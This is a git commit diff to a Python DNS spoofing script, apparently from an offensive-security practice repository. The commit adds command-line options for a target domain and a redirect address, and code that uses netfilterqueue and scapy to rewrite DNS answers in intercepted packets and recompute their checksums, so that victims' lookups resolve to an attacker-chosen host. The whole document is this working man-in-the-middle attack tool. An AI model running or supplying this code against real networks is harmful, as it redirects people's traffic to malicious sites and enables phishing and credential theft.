b1dcbfdeb73ba5b2b64617c054a7bf0889116daa
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-01-16 15:45:02 +0100

    Modify and redirect

--- DNS_spoofer/dns_spoofer.py
+++ DNS_spoofer/dns_spoofer.py
@@ -2,13 +2,32 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import argparse
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-s", "--spoof", dest="original_site", help="Specify a site to spoof")
+parser.add_argument("-r", "--redirect", dest="redirect_site", help="Specify a site to redirect to")
+options = parser.parse_args()
 
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     # DNS Resource Record
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if options.original_site+"." in qname:
+            print("[+] Spoofing Target")
+            answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_site)
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
     packet.accept()
 
 
